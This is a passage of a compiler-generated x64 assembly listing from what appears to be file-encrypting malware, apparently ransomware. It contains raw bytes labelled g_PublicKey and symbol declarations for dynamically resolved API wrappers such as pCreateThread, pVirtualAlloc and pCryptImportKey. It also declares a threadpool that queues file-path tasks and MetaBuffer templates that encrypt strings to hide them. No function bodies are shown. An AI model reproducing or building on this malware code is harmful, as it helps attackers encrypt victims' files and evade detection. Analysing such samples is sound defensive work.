	DB	'n', 0a2H, '(', 018H, 0eaH, 'C4', 099H, '`', 0bcH, 0c5H, 097H, 'A'
	DB	0f8H, '|P', 0f3H, 08bH, 'o', 0e0H, 07H, 0a4H, 0cfH, 0c9H, 0fH, 'f'
	DB	'D', 0b1H, 0c3H, 0bcH, 'j', 0fbH, 0fdH, 'bBt}#p', 09fH, '{7', 0ffH
	DB	'i', 09eH, 0f8H, 'j', 0c3H, '?''', 0c5H, 0aaH, 0bbH, 0d9H, 0d4H
	DB	'B', 0f1H, 08aH, 0caH, 089H, 'q', 0c9H, 0ecH, 0dfH, 0b1H, 083H
	DB	'''', 0cdH, 0a5H, 0beH, 097H, 0deH, 0e7H, 'x', 0d4H, 0a9H, 0e0H
	DB	0e8H, '8u?', 098H, 'la', 0dcH, '{', 0c6H, 0eeH, 0eaH, 0a5H, 0e4H
	DB	09aH, 0a3H, 0cfH, 'R', 0d0H, 0c8H, 08aH, 0d1H, 0daH, 0f1H, '+', 0dH
	DB	'N.', 0cfH, 016H, 08dH, 016H, 092H, 07H, 014H, 0f9H, 'h', 097H
	DB	015H, 'J!', 0a7H, '2D', 089H, 012H, 0dcH, 0a4H, '+', 0e8H, 083H
	DB	0c1H, 0dbH, 0edH, 0b1H, 086H, 0bdH, '9vey', 02H, 09eH, 0baH, 0d5H
	DB	0b4H, 0eeH, 0e0H, 098H, 'K', 0f8H, 0c0H, 'H+1', 02H, 013H, 0ffH
	DB	'2', 015H, 'S;', 0c8H, '1', 091H, 010H, 00H, 083H, '=,', 0a7H, '4'
	DB	0dcH, 0d7H, 0dcH, 097H, 09bH, 'At', 0eeH, 'm', 0c8H, 09bH, 081H
	DB	09eH, 08cH, 0baH, 0b9H, 'a', 081H, 0deH, 0baH, 0fdH, '{', 0cfH
	DB	0faH, 0e7H, 'h', 0d7H, 0f0H, 09aH, 0c7H, '\?', 016H, 'xn', 00H ; g_PublicKey
	ORG $+1771
_DATA	ENDS
CONST	SEGMENT
?_Fake_alloc@std@@3U_Fake_allocator@1@B	ORG $+1		; std::_Fake_alloc
CONST	ENDS
PUBLIC	RtlSecureZeroMemory
PUBLIC	??2@YAPEAX_KPEAX@Z				; operator new
PUBLIC	?max@?$numeric_limits@_J@std@@SA_JXZ		; std::numeric_limits<__int64>::max
PUBLIC	??0exception@std@@QEAA@QEBDH@Z			; std::exception::exception
PUBLIC	??0exception@std@@QEAA@AEBV01@@Z		; std::exception::exception
PUBLIC	??1exception@std@@UEAA@XZ			; std::exception::~exception
PUBLIC	?what@exception@std@@UEBAPEBDXZ			; std::exception::what
PUBLIC	??_Gexception@std@@UEAAPEAXI@Z			; std::exception::`scalar deleting destructor'
PUBLIC	??0bad_alloc@std@@AEAA@QEBD@Z			; std::bad_alloc::bad_alloc
PUBLIC	??1bad_alloc@std@@UEAA@XZ			; std::bad_alloc::~bad_alloc
PUBLIC	??0bad_alloc@std@@QEAA@AEBV01@@Z		; std::bad_alloc::bad_alloc
PUBLIC	??_Gbad_alloc@std@@UEAAPEAXI@Z			; std::bad_alloc::`scalar deleting destructor'
PUBLIC	??0bad_array_new_length@std@@QEAA@XZ		; std::bad_array_new_length::bad_array_new_length
PUBLIC	??1bad_array_new_length@std@@UEAA@XZ		; std::bad_array_new_length::~bad_array_new_length
PUBLIC	??0bad_array_new_length@std@@QEAA@AEBV01@@Z	; std::bad_array_new_length::bad_array_new_length
PUBLIC	??_Gbad_array_new_length@std@@UEAAPEAXI@Z	; std::bad_array_new_length::`scalar deleting destructor'
PUBLIC	?_Throw_bad_array_new_length@std@@YAXXZ		; std::_Throw_bad_array_new_length
PUBLIC	?_Allocate@_Default_allocate_traits@std@@SAPEAX_K@Z ; std::_Default_allocate_traits::_Allocate
PUBLIC	?_Adjust_manually_vector_aligned@std@@YAXAEAPEAXAEA_K@Z ; std::_Adjust_manually_vector_aligned
PUBLIC	?_Orphan_all@_Container_base0@std@@QEAAXXZ	; std::_Container_base0::_Orphan_all
PUBLIC	?_Alloc_proxy@_Container_base0@std@@QEAAXAEBU_Fake_allocator@2@@Z ; std::_Container_base0::_Alloc_proxy
PUBLIC	??0_Fake_proxy_ptr_impl@std@@QEAA@AEBU_Fake_allocator@1@AEBU_Container_base0@1@@Z ; std::_Fake_proxy_ptr_impl::_Fake_proxy_ptr_impl
PUBLIC	?_Release@_Fake_proxy_ptr_impl@std@@QEAAXXZ	; std::_Fake_proxy_ptr_impl::_Release
PUBLIC	?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z ; std::_Char_traits<wchar_t,unsigned short>::copy
PUBLIC	?move@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z ; std::_Char_traits<wchar_t,unsigned short>::move
PUBLIC	?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z	; std::_WChar_traits<wchar_t>::assign
PUBLIC	?_Xlen_string@std@@YAXXZ			; std::_Xlen_string
PUBLIC	??0?$allocator@_W@std@@QEAA@XZ			; std::allocator<wchar_t>::allocator<wchar_t>
PUBLIC	?deallocate@?$allocator@_W@std@@QEAAXQEA_W_K@Z	; std::allocator<wchar_t>::deallocate
PUBLIC	?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z	; std::allocator<wchar_t>::allocate
PUBLIC	?max_size@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA_KAEBV?$allocator@_W@2@@Z ; std::_Default_allocator_traits<std::allocator<wchar_t> >::max_size
PUBLIC	?select_on_container_copy_construction@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA?AV?$allocator@_W@2@AEBV32@@Z ; std::_Default_allocator_traits<std::allocator<wchar_t> >::select_on_container_copy_construction
PUBLIC	??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ; std::_String_val<std::_Simple_types<wchar_t> >::_String_val<std::_Simple_types<wchar_t> >
PUBLIC	?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAPEA_WXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr
PUBLIC	?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBAPEB_WXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr
PUBLIC	?_Large_mode_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBA_NXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Large_mode_engaged
PUBLIC	?_Activate_SSO_buffer@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Activate_SSO_buffer
PUBLIC	??0_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::_Bxty
PUBLIC	??1_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::~_Bxty
PUBLIC	?_Switch_to_buf@_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::_Switch_to_buf
PUBLIC	??1?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ; std::_String_val<std::_Simple_types<wchar_t> >::~_String_val<std::_Simple_types<wchar_t> >
PUBLIC	??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
PUBLIC	??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
PUBLIC	?_Deallocate_for_capacity@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAXAEAV?$allocator@_W@2@QEA_W_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Deallocate_for_capacity
PUBLIC	?_Construct_empty@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct_empty
PUBLIC	??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::~basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
PUBLIC	??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@AEBV01@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::operator=
PUBLIC	?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign
PUBLIC	?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
PUBLIC	?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
PUBLIC	?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBA_K_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
PUBLIC	?_Tidy_deallocate@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Tidy_deallocate
PUBLIC	?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
PUBLIC	?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
PUBLIC	?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAAAEAV?$allocator@_W@2@XZ ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first
PUBLIC	?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEBAAEBV?$allocator@_W@2@XZ ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first
PUBLIC	??1?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@XZ ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::~_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>
PUBLIC	?pCreateThread@@YAPEAXPEAU_SECURITY_ATTRIBUTES@@_KP6AKPEAX@Z2KPEAK@Z ; pCreateThread
PUBLIC	?pEnterCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z ; pEnterCriticalSection
PUBLIC	?pLeaveCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z ; pLeaveCriticalSection
PUBLIC	?pInitializeCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z ; pInitializeCriticalSection
PUBLIC	?pExitThread@@YAXK@Z				; pExitThread
PUBLIC	?pSleep@@YAXK@Z					; pSleep
PUBLIC	?pVirtualAlloc@@YAPEAXPEAX_KKK@Z		; pVirtualAlloc
PUBLIC	?pWaitForMultipleObjects@@YAKKPEBQEAXHK@Z	; pWaitForMultipleObjects
PUBLIC	?pCryptImportKey@@YAH_KPEBEK0KPEA_K@Z		; pCryptImportKey
PUBLIC	?pCryptAcquireContextA@@YAHPEA_KPEBD1KK@Z	; pCryptAcquireContextA
PUBLIC	?Initialize@threadpool@@YAXXZ			; threadpool::Initialize
PUBLIC	?Create@threadpool@@YAHH_K@Z			; threadpool::Create
PUBLIC	?Start@threadpool@@YAHH@Z			; threadpool::Start
PUBLIC	?PutTask@threadpool@@YAHHV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z ; threadpool::PutTask
PUBLIC	?PutFinalTask@threadpool@@YAHH@Z		; threadpool::PutFinalTask
PUBLIC	?IsActive@threadpool@@YAHH@Z			; threadpool::IsActive
PUBLIC	?Wait@threadpool@@YAXH@Z			; threadpool::Wait
PUBLIC	?positive_modulo@@YAHHH@Z			; positive_modulo
PUBLIC	??0task_info_@@QEAA@XZ				; task_info_::task_info_
PUBLIC	?GetCryptoProvider@@YAHPEA_K@Z			; GetCryptoProvider
PUBLIC	??0?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEAA@PEBE@Z ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >
PUBLIC	?isDecrypted@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEBA_NXZ ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEAAPEBDXZ ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::decrypt
PUBLIC	??0?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEAA@PEBE@Z ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >
PUBLIC	?isDecrypted@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEBA_NXZ ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEAAPEBDXZ ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::decrypt
PUBLIC	??0?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAA@PEBE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >
PUBLIC	?isDecrypted@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEBA_NXZ ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAAPEBDXZ ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::decrypt
PUBLIC	??0?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAA@PEBE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >
